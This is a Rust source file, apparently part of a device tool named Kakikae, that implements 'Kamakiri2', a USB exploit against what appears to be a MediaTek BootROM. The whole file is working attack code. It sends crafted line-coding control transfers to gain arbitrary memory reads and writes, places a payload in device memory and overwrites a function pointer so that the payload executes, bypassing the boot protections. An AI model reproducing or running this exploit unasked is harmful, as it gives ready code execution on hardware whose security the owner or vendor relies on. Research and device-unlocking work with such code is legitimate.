use nusb::Device;
use nusb::transfer::{ControlIn, ControlOut, ControlType, Recipient};
use tokio::time::sleep;
use crate::{cmd_read_32, cmd_register_access, DeviceEndpoint, DEFAULT_TIMEOUT, PAYLOAD_ADDRESS, SHORT_TIMEOUT, WATCHDOG_PTR};
use crate::error::KakikaeError;

pub struct Kamakiri2<'a> {
    device: &'a mut Device,
    ep: &'a mut DeviceEndpoint,
    linecode: Vec<u8>
}
impl<'a> Kamakiri2<'a> {
    pub fn new(device: &'a mut Device, ep: &'a mut DeviceEndpoint) -> Self {
        Self {
            device,
            ep,
            linecode: vec![],
        }
    }
    pub async fn send_da(
        &mut self,
        payload: &[u8]
    ) -> Result<(), KakikaeError> {
        self.linecode = self.device.control_in(ControlIn {
            control_type: ControlType::Class,
            recipient: Recipient::Interface,
            request: 0x21,
            value: 0,
            index: 0x0,
            length: 7
        }, DEFAULT_TIMEOUT).await?;
        self.linecode.push(0);
        let ptr_send_result = self.read_da(0xe2a4, 4,true).await?;
        let ptr_send_bytes: [u8; 4] = ptr_send_result.try_into()
            .map_err(|v| KakikaeError::IntConvertFail(v))?;
        let ptr_send = u32::from_le_bytes(ptr_send_bytes) + 8;
        self.write_da(PAYLOAD_ADDRESS, payload.len() as u32, payload, true).await?;
        self.write_da(ptr_send, 4, &PAYLOAD_ADDRESS.to_le_bytes(), false).await?;
        sleep(SHORT_TIMEOUT).await;
        Ok(())
    }
    async fn read_da(
        &mut self,
        address: u32,
        length: u32,
        check_status: bool
    ) -> Result<Vec<u8>, KakikaeError> {
        self.read_write_da(0, address, length, Default::default(), check_status).await
    }
    async fn write_da(
        &mut self,
        address: u32,
        length: u32,
        data: &[u8],
        check_status: bool
    ) -> Result<(), KakikaeError> {
        self.read_write_da(1, address, length, data, check_status).await?;
        Ok(())
    }
    #[allow(unused_must_use)]
    async fn read_write_da(
        &mut self,
        direction: u32,
        address: u32,
        length: u32,
        data: &[u8],
        check_status: bool
    )  -> Result<Vec<u8>, KakikaeError>{
        match cmd_register_access(self.ep, 0, 0, 1, vec![], true).await {
            Ok(_) => {
                cmd_read_32(self.ep, WATCHDOG_PTR + 0x50, 1).await;
            },
            _ => {}
        }; // These are failable

        for i in 0..3 {
            let bytes = &(0xe764_u32 + 8 - 3 + i).to_le_bytes();
            self.ctrl_transfer(bytes).await;
        }
        if address < 0x40 {
            for i in 0..4 {
                let bytes = &(0xe764_u32 - 6 + (4 - i)).to_le_bytes();
                &self.ctrl_transfer(bytes).await;
            }
            cmd_register_access(self.ep, direction, address, length, data.to_vec(), check_status).await
        } else {
            for i in 0..3 {
                let bytes = &(0xe764_u32 - 5 + (3 - i)).to_le_bytes();
                self.ctrl_transfer(bytes).await;
            }
            cmd_register_access(self.ep, direction, address - 0x40, length, data.to_vec(), check_status).await
        }
    }

    async fn ctrl_transfer(
        &mut self,
        bytes: &[u8],
    ) -> Result<(), KakikaeError> {
        let mut out_data = self.linecode.clone();
        out_data.extend_from_slice(bytes);
        self.device.control_out(ControlOut {
            control_type: ControlType::Class,
            recipient: Recipient::Interface,
            request: 0x20,
            value: 0,
            index: 0,
            data: &out_data
        }, DEFAULT_TIMEOUT).await?;
        self.device.control_in(ControlIn {
            control_type: ControlType::Standard,
            recipient: Recipient::Device,
            request: 0x6,
            value: 0x0200,
            index: 0,
            length: 9,
        }, DEFAULT_TIMEOUT).await?;
        Ok(())
    }
}
